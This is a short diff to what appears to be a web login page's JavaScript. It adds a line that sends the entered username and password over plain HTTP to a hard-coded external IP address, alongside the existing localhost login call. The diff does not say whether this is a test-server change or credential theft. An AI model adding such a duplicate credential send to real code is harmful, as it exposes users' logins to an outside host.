@@ -183,6 +183,7 @@
             var username = document.getElementsByName('username')[0].value; //복수의 값
             var password = document.getElementsByName('password')[0].value;
             sendAjax('http://localhost:3000/login', {'username' : username, 'password' : password});
+            sendAjax('http://210.123.254.133:3000/login', {'username' : username, 'password' : password});
         });// http://127.0.0.1:3000
 
         function sendAjax(url, data){
